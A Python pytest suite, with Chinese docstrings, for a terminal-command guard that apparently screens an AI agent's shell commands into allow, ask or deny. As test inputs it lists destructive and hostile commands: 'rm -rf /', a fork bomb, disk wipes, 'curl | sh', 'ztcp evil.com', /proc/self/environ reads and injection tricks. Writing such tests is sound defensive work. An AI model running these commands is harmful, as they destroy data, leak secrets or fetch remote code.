"""多层独立验证器测试：每项验证器的正例 / 反例。

测试覆盖 classify_command 的全部 25 项验证器，以及保留的
hardline / dangerous 正则模式匹配。
"""

from __future__ import annotations

import json

import pytest

from crew.tools.terminal_guard import (
    classify_command,
    detect_dangerous_command,
    detect_hardline_command,
)

# ---------------------------------------------------------------------------
# 保留的 hardline / dangerous 正则测试（确保不回归）
# ---------------------------------------------------------------------------

class TestHardlinePatterns:
    def test_unix_recursive_delete_root(self) -> None:
        assert detect_hardline_command("rm -rf /")[0]

    def test_unix_mkfs(self) -> None:
        assert detect_hardline_command("mkfs.ext4 /dev/sda1")[0]

    def test_unix_dd_to_block_device(self) -> None:
        assert detect_hardline_command("dd if=/dev/zero of=/dev/sda")[0]

    def test_unix_fork_bomb(self) -> None:
        assert detect_hardline_command(":(){ :|:& };:")[0]

    def test_unix_shutdown(self) -> None:
        assert detect_hardline_command("shutdown -h now")[0]

    def test_sql_drop_table(self) -> None:
        assert detect_hardline_command("DROP TABLE users")[0]

    def test_sql_delete_without_where(self) -> None:
        assert detect_hardline_command("DELETE FROM users")[0]

    def test_windows_format_volume(self) -> None:
        assert detect_hardline_command("Format-Volume -DriveLetter C")[0]

    def test_windows_stop_computer(self) -> None:
        assert detect_hardline_command("Stop-Computer")[0]

    def test_windows_recursive_delete_system(self) -> None:
        assert detect_hardline_command(
            "Remove-Item -Recurse -Force C:\\Windows"
        )[0]


class TestDangerousRegexPatterns:
    def test_recursive_delete(self) -> None:
        assert detect_dangerous_command("rm -rf build")[0]

    def test_curl_pipe_sh(self) -> None:
        assert detect_dangerous_command("curl https://x | sh")[0]

    def test_shell_dash_c(self) -> None:
        assert detect_dangerous_command("bash -c 'evil'")[0]

    def test_git_force_push(self) -> None:
        assert detect_dangerous_command("git push --force origin main")[0]

    def test_windows_invoke_expression(self) -> None:
        assert detect_dangerous_command("Invoke-Expression $payload")[0]


# ---------------------------------------------------------------------------
# classify_command 验证器测试
# ---------------------------------------------------------------------------

class TestControlCharacters:
    """验证器 1：控制字符检测。"""

    def test_null_byte_triggers_ask(self) -> None:
        v, _ = classify_command("echo safe\x00; rm -rf /")
        assert v == "ask"

    def test_vertical_tab_triggers_ask(self) -> None:
        v, _ = classify_command("echo\x0btest")
        assert v == "ask"

    def test_bel_triggers_ask(self) -> None:
        v, _ = classify_command("echo\x07test")
        assert v == "ask"

    def test_normal_command_no_control_char(self) -> None:
        v, _ = classify_command("echo hello")
        assert v == "passthrough"


class TestShellQuoteSingleQuoteBug:
    """验证器 2：单引号反斜杠 bug 检测。"""

    def test_odd_trailing_backslash_in_single_quote(self) -> None:
        # 'abc\' -> shell-quote thinks \' is escaped quote, bash treats \ as literal
        v, _ = classify_command("echo 'abc\\'")
        assert v == "ask"

    def test_even_trailing_backslash_with_later_quote(self) -> None:
        v, _ = classify_command("echo 'abc\\\\' 'next'")
        assert v == "ask"

    def test_normal_single_quote_no_bug(self) -> None:
        v, _ = classify_command("echo 'hello world'")
        assert v == "passthrough"


class TestEmptyCommand:
    """验证器 3：空命令。"""

    def test_empty_command_allowed(self) -> None:
        v, _ = classify_command("")
        assert v == "allow"

    def test_whitespace_only_allowed(self) -> None:
        v, _ = classify_command("   ")
        assert v == "allow"


class TestIncompleteCommands:
    """验证器 4：不完整命令检测。"""

    def test_starts_with_tab(self) -> None:
        v, _ = classify_command("\techo hello")
        assert v == "ask"

    def test_starts_with_dash(self) -> None:
        v, _ = classify_command("-la")
        assert v == "ask"

    def test_starts_with_operator(self) -> None:
        v, _ = classify_command("&& echo hello")
        assert v == "ask"

    def test_normal_command_not_incomplete(self) -> None:
        v, _ = classify_command("echo hello")
        assert v == "passthrough"


class TestSafeCommandSubstitution:
    """验证器 5：安全 heredoc 命令替换。"""

    def test_safe_heredoc_allowed(self) -> None:
        cmd = "echo $(cat <<'EOF'\nhello\nEOF\n)"
        v, _ = classify_command(cmd)
        assert v == "allow"

    def test_unsafe_heredoc_not_allowed(self) -> None:
        cmd = "$(cat <<EOF\nevil\nEOF\n)"
        v, _ = classify_command(cmd)
        # Should not be allow - either ask or passthrough
        assert v != "allow"


class TestGitCommit:
    """验证器 6：git commit 简单消息。"""

    def test_simple_quoted_message_allowed(self) -> None:
        v, _ = classify_command("git commit -m 'fix bug'")
        assert v == "allow"

    def test_double_quoted_message_allowed(self) -> None:
        v, _ = classify_command('git commit -m "fix bug"')
        assert v == "allow"

    def test_git_status_passthrough(self) -> None:
        v, _ = classify_command("git status")
        assert v == "passthrough"

    def test_git_commit_with_redirect_not_allowed(self) -> None:
        v, _ = classify_command("git commit -m 'msg' > ~/.bashrc")
        assert v != "allow"


class TestJqCommand:
    """验证器 7：jq 命令安全检测。"""

    def test_jq_system_function_ask(self) -> None:
        v, _ = classify_command('jq "system(\\"id\\")"')
        assert v == "ask"

    def test_jq_from_file_ask(self) -> None:
        v, _ = classify_command("jq -f script.jq")
        assert v == "ask"

    def test_jq_rawfile_ask(self) -> None:
        v, _ = classify_command("jq --rawfile x data.txt")
        assert v == "ask"

    def test_normal_jq_passthrough(self) -> None:
        v, _ = classify_command("jq '.foo' data.json")
        assert v == "passthrough"


class TestObfuscatedFlags:
    """验证器 8：混淆 flag 检测。"""

    def test_quoted_flag_name_ask(self) -> None:
        v, _ = classify_command("ls '-la'")
        assert v == "ask"

    def test_split_quote_flag_ask(self) -> None:
        v, _ = classify_command('ls "-"la')
        assert v == "ask"

    def test_normal_flag_not_obfuscated(self) -> None:
        v, _ = classify_command("ls -la")
        assert v == "passthrough"


class TestShellMetacharacters:
    """验证器 9：shell 元字符检测。

    此验证器检查 withDoubleQuotes 内容中出现的引号字符 + 元字符模式。
    引号字符仅在转义引号 (\\") 或双引号内的单引号场景下出现在内容中。
    """

    def test_normal_find_passthrough(self) -> None:
        v, _ = classify_command("find . -name '*.py'")
        assert v == "passthrough"

    def test_double_quoted_semicolon_passthrough(self) -> None:
        # Double-quoted ; is literal in bash; quote chars stripped from content.
        v, _ = classify_command('find . -name ";evil"')
        assert v == "passthrough"

    def test_find_regex_with_pipe_passthrough(self) -> None:
        # -regex with | in quotes; quote chars stripped from content.
        v, _ = classify_command("find . -regex 'foo|bar'")
        assert v == "passthrough"


class TestDangerousVariables:
    """验证器 10：危险变量检测。"""

    def test_variable_in_redirection_ask(self) -> None:
        v, _ = classify_command("echo hello >$FILE")
        assert v == "ask"

    def test_variable_before_pipe_ask(self) -> None:
        v, _ = classify_command("$CMD | grep foo")
        assert v == "ask"

    def test_normal_variable_passthrough(self) -> None:
        v, _ = classify_command("echo $HOME")
        assert v == "passthrough"


class TestCommentQuoteDesync:
    """验证器 11：注释引号不同步检测。"""

    def test_quote_in_comment_ask(self) -> None:
        v, _ = classify_command("echo hi # ' \" ")
        assert v == "ask"

    def test_comment_without_quotes_passthrough(self) -> None:
        v, _ = classify_command("echo hi # this is a comment")
        assert v == "passthrough"


class TestQuotedNewline:
    """验证器 12：引号内换行 + 下一行 # 检测。"""

    def test_quoted_newline_with_hash_ask(self) -> None:
        cmd = "mv decoy '<\n#hidden' dest"
        v, _ = classify_command(cmd)
        assert v == "ask"

    def test_normal_multiline_passthrough(self) -> None:
        v, _ = classify_command("echo hello")
        assert v == "passthrough"


class TestCarriageReturn:
    """验证器 13：回车检测。"""

    def test_cr_outside_double_quotes_ask(self) -> None:
        v, _ = classify_command("echo safe\rwhoami")
        assert v == "ask"

    def test_no_cr_passthrough(self) -> None:
        v, _ = classify_command("echo hello")
        assert v == "passthrough"


class TestNewlines:
    """验证器 14：换行检测。"""

    def test_newline_separating_commands_ask(self) -> None:
        v, _ = classify_command("echo safe\nwhoami")
        assert v == "ask"

    def test_backslash_newline_continuation_passthrough(self) -> None:
        v, _ = classify_command("echo \\\nhello")
        assert v == "passthrough"


class TestIFSInjection:
    """验证器 15：IFS 注入检测。"""

    def test_dollar_ifs_ask(self) -> None:
        v, _ = classify_command("echo $IFS")
        assert v == "ask"

    def test_brace_ifs_ask(self) -> None:
        v, _ = classify_command("echo ${IFS}")
        assert v == "ask"

    def test_ifs_substring_ask(self) -> None:
        v, _ = classify_command("echo ${IFS:0:1}")
        assert v == "ask"


class TestProcEnvironAccess:
    """验证器 16：/proc/*/environ 访问检测。"""

    def test_proc_self_environ_ask(self) -> None:
        v, _ = classify_command("cat /proc/self/environ")
        assert v == "ask"

    def test_proc_pid_environ_ask(self) -> None:
        v, _ = classify_command("cat /proc/1/environ")
        assert v == "ask"

    def test_normal_cat_passthrough(self) -> None:
        v, _ = classify_command("cat file.txt")
        assert v == "passthrough"


class TestDangerousSubstitutionPatterns:
    """验证器 17：危险模式检测（命令替换、参数展开等）。"""

    def test_backtick_substitution_ask(self) -> None:
        v, _ = classify_command("echo `whoami`")
        assert v == "ask"

    def test_dollar_paren_substitution_ask(self) -> None:
        v, _ = classify_command("echo $(whoami)")
        assert v == "ask"

    def test_dollar_brace_substitution_ask(self) -> None:
        v, _ = classify_command("echo ${HOME}")
        assert v == "ask"

    def test_process_substitution_in_ask(self) -> None:
        v, _ = classify_command("cat <(whoami)")
        assert v == "ask"

    def test_process_substitution_out_ask(self) -> None:
        v, _ = classify_command("echo >(cat)")
        assert v == "ask"

    def test_powershell_comment_syntax_ask(self) -> None:
        v, _ = classify_command("echo <# comment #> hello")
        assert v == "ask"


class TestRedirections:
    """验证器 18：重定向检测。"""

    def test_input_redirection_ask(self) -> None:
        v, _ = classify_command("cat < /etc/passwd")
        assert v == "ask"

    def test_output_redirection_ask(self) -> None:
        v, _ = classify_command("echo hello > /tmp/file")
        assert v == "ask"

    def test_safe_dev_null_not_flagged(self) -> None:
        v, _ = classify_command("echo hello 2>/dev/null")
        # 2>/dev/null is stripped by strip_safe_redirections
        assert v == "passthrough"


class TestBackslashEscapedWhitespace:
    """验证器 19：反斜杠转义空白检测。"""

    def test_escaped_space_ask(self) -> None:
        v, _ = classify_command("echo\\ test")
        assert v == "ask"

    def test_escaped_tab_ask(self) -> None:
        v, _ = classify_command("echo\\\ttest")
        assert v == "ask"

    def test_normal_space_passthrough(self) -> None:
        v, _ = classify_command("echo test")
        assert v == "passthrough"


class TestBackslashEscapedOperators:
    """验证器 20：反斜杠转义操作符检测。"""

    def test_escaped_semicolon_ask(self) -> None:
        v, _ = classify_command("echo safe\\; rm -rf /")
        assert v == "ask"

    def test_escaped_pipe_ask(self) -> None:
        v, _ = classify_command("echo safe\\| grep foo")
        assert v == "ask"

    def test_normal_pipe_passthrough(self) -> None:
        v, _ = classify_command("echo safe | grep foo")
        assert v == "passthrough"


class TestUnicodeWhitespace:
    """验证器 21：Unicode 空白检测。"""

    def test_nbsp_ask(self) -> None:
        v, _ = classify_command("ls\u00a0-la")
        assert v == "ask"

    def test_em_space_ask(self) -> None:
        v, _ = classify_command("ls\u2003-la")
        assert v == "ask"

    def test_normal_space_passthrough(self) -> None:
        v, _ = classify_command("ls -la")
        assert v == "passthrough"


class TestMidWordHash:
    """验证器 22：中间 # 检测。"""

    def test_mid_word_hash_ask(self) -> None:
        v, _ = classify_command("echo foo#bar")
        assert v == "ask"

    def test_word_start_hash_passthrough(self) -> None:
        v, _ = classify_command("echo # comment")
        assert v == "passthrough"

    def test_brace_hash_not_flagged(self) -> None:
        # ${#VAR} contains ${ which triggers dangerous patterns validator.
        # The mid-word hash validator itself should NOT flag ${#} syntax.
        # Overall verdict is ask (from ${} pattern), not from mid-word hash.
        v, r = classify_command("echo ${#VAR}")
        assert v == "ask"
        assert "parameter substitution" in r


class TestBraceExpansion:
    """验证器 23：花括号展开检测。"""

    def test_comma_brace_expansion_ask(self) -> None:
        v, _ = classify_command("echo {a,b}")
        assert v == "ask"

    def test_sequence_brace_expansion_ask(self) -> None:
        v, _ = classify_command("echo {1..5}")
        assert v == "ask"

    def test_quoted_brace_passthrough(self) -> None:
        v, _ = classify_command("echo '{a,b}'")
        assert v == "passthrough"

    def test_no_brace_passthrough(self) -> None:
        v, _ = classify_command("echo hello")
        assert v == "passthrough"


class TestZshDangerousCommands:
    """验证器 24：Zsh 危险命令检测。"""

    def test_zmodload_ask(self) -> None:
        v, _ = classify_command("zmodload zsh/system")
        assert v == "ask"

    def test_sysopen_ask(self) -> None:
        v, _ = classify_command("sysopen -r fd /etc/passwd")
        assert v == "ask"

    def test_ztcp_ask(self) -> None:
        v, _ = classify_command("ztcp evil.com 80")
        assert v == "ask"

    def test_fc_dash_e_ask(self) -> None:
        v, _ = classify_command("fc -e vim 1")
        assert v == "ask"

    def test_normal_command_passthrough(self) -> None:
        v, _ = classify_command("echo hello")
        assert v == "passthrough"


class TestMalformedTokenInjection:
    """验证器 25：畸形 token 注入检测。"""

    def test_unbalanced_braces_with_separator_ask(self) -> None:
        # Unbalanced braces + command separator = ambiguous syntax
        v, _ = classify_command("echo {test; whoami")
        assert v == "ask"

    def test_unbalanced_parens_with_separator_ask(self) -> None:
        v, _ = classify_command("echo (test; whoami")
        assert v == "ask"

    def test_balanced_command_passthrough(self) -> None:
        v, _ = classify_command("echo hello && echo world")
        assert v == "passthrough"


# ---------------------------------------------------------------------------
# 集成测试：多层防线协同
# ---------------------------------------------------------------------------

class TestIntegrationLayers:
    """验证 hardline -> dangerous -> classify_command 的执行顺序。"""

    def test_hardline_takes_precedence_over_classify(self) -> None:
        """rm -rf / 命中 hardline，不应进入 classify_command。"""
        allowed, _, code = _check_terminal_layers("rm -rf /")
        assert allowed is False
        assert code == "policy_denied"

    def test_dangerous_takes_precedence_over_classify(self) -> None:
        """rm -rf build 命中 dangerous，不应进入 classify_command。"""
        allowed, _, code = _check_terminal_layers("rm -rf build")
        assert allowed is False
        assert code == "approval_required"

    def test_classify_command_catches_injection(self) -> None:
        """命令替换不被 hardline/dangerous 捕获，但被 classify_command 捕获。"""
        allowed, _, code = _check_terminal_layers("echo $(whoami)")
        assert allowed is False
        assert code == "approval_required"

    def test_safe_command_passes_all_layers(self) -> None:
        allowed, _, _ = _check_terminal_layers("ls -la")
        assert allowed is True


def _check_terminal_layers(command: str) -> tuple[bool, str | None, str | None]:
    """模拟 builtin._check_terminal_command 的三层防线。"""
    is_hardline, hardline_desc = detect_hardline_command(command)
    if is_hardline:
        return (False, f"BLOCKED (hardline): {hardline_desc}", "policy_denied")
    is_dangerous, dangerous_desc = detect_dangerous_command(command)
    if is_dangerous:
        return (False, f"DANGEROUS: {dangerous_desc}", "approval_required")
    verdict, reason = classify_command(command)
    if verdict == "ask":
        return (False, f"SECURITY CHECK: {reason}", "approval_required")
    return (True, None, None)


# ---------------------------------------------------------------------------
# 端到端测试：通过实际工具入口验证整条链路
# ---------------------------------------------------------------------------

class TestE2ETerminalHandler:
    """端到端测试：直接调用 handle_terminal 验证整条命令执行链路。

    不传 security_service，走简化路径：_check_terminal_command ->
    如果 allowed=False 且 error_code != policy_denied -> 返回 error。
    安全命令真正执行。
    """

    @pytest.mark.asyncio
    async def test_hardline_blocked(self) -> None:
        from crew.tools.builtin import handle_terminal

        result = await handle_terminal({"command": "rm -rf /"}, timeout=5.0)
        parsed = json.loads(result)
        assert parsed["success"] is False
        assert parsed["error_code"] == "policy_denied"

    @pytest.mark.asyncio
    async def test_dangerous_blocked(self) -> None:
        from crew.tools.builtin import handle_terminal

        result = await handle_terminal({"command": "rm -rf build"}, timeout=5.0)
        parsed = json.loads(result)
        assert parsed["success"] is False
        assert parsed["error_code"] == "approval_required"

    @pytest.mark.asyncio
    async def test_classify_command_substitution_blocked(self) -> None:
        from crew.tools.builtin import handle_terminal

        result = await handle_terminal({"command": "echo $(whoami)"}, timeout=5.0)
        parsed = json.loads(result)
        assert parsed["success"] is False
        assert parsed["error_code"] == "approval_required"

    @pytest.mark.asyncio
    async def test_classify_command_backtick_blocked(self) -> None:
        from crew.tools.builtin import handle_terminal

        result = await handle_terminal({"command": "echo `whoami`"}, timeout=5.0)
        parsed = json.loads(result)
        assert parsed["success"] is False
        assert parsed["error_code"] == "approval_required"

    @pytest.mark.asyncio
    async def test_classify_command_ifs_blocked(self) -> None:
        from crew.tools.builtin import handle_terminal

        result = await handle_terminal({"command": "echo $IFS"}, timeout=5.0)
        parsed = json.loads(result)
        assert parsed["success"] is False
        assert parsed["error_code"] == "approval_required"

    @pytest.mark.asyncio
    async def test_classify_command_proc_environ_blocked(self) -> None:
        from crew.tools.builtin import handle_terminal

        result = await handle_terminal({"command": "cat /proc/self/environ"}, timeout=5.0)
        parsed = json.loads(result)
        assert parsed["success"] is False
        assert parsed["error_code"] == "approval_required"

    @pytest.mark.asyncio
    async def test_classify_command_zsh_blocked(self) -> None:
        from crew.tools.builtin import handle_terminal

        result = await handle_terminal({"command": "zmodload zsh/system"}, timeout=5.0)
        parsed = json.loads(result)
        assert parsed["success"] is False
        assert parsed["error_code"] == "approval_required"

    @pytest.mark.asyncio
    async def test_classify_command_brace_expansion_blocked(self) -> None:
        from crew.tools.builtin import handle_terminal

        result = await handle_terminal({"command": "echo {a,b}"}, timeout=5.0)
        parsed = json.loads(result)
        assert parsed["success"] is False
        assert parsed["error_code"] == "approval_required"

    @pytest.mark.asyncio
    async def test_safe_command_executes(self) -> None:
        from crew.tools.builtin import handle_terminal

        result = await handle_terminal({"command": "echo ace_e2e_ok"}, timeout=5.0)
        parsed = json.loads(result)
        assert parsed["success"] is True

    @pytest.mark.asyncio
    async def test_safe_pipe_command_executes(self) -> None:
        from crew.tools.builtin import handle_terminal

        result = await handle_terminal({"command": "echo hello | head -1"}, timeout=5.0)
        parsed = json.loads(result)
        assert parsed["success"] is True


class TestE2EWorkspaceGuard:
    """端到端测试：通过 classify_external_permission 验证 workspace guard 链路。"""

    def _guard(self) -> dict:
        return {
            "enabled": True,
            "root": "/tmp",
            "readable_roots": ["/tmp"],
            "writable_roots": ["/tmp"],
        }

    def _call(self, command: str) -> str:
        from crew.team.workspace_guard import classify_external_permission

        decision = classify_external_permission(
            {"rawInput": {"tool": "terminal", "arguments": {"command": command}}},
            self._guard(),
            cwd="/tmp",
        )
        return decision.action

    def test_hardline_denied(self) -> None:
        assert self._call("rm -rf /") == "deny"

    def test_dangerous_asked(self) -> None:
        assert self._call("rm -rf /tmp/build") == "ask"

    def test_command_substitution_asked(self) -> None:
        assert self._call("echo $(whoami)") == "ask"

    def test_ifs_injection_asked(self) -> None:
        assert self._call("echo $IFS") == "ask"

    def test_zsh_dangerous_asked(self) -> None:
        assert self._call("zmodload zsh/system") == "ask"

    def test_brace_expansion_asked(self) -> None:
        assert self._call("echo {a,b}") == "ask"

    def test_safe_command_allowed(self) -> None:
        assert self._call("ls /tmp") == "allow"

    def test_safe_echo_allowed(self) -> None:
        assert self._call("echo hello") == "allow"

    def test_safe_git_allowed(self) -> None:
        assert self._call("git status") == "allow"
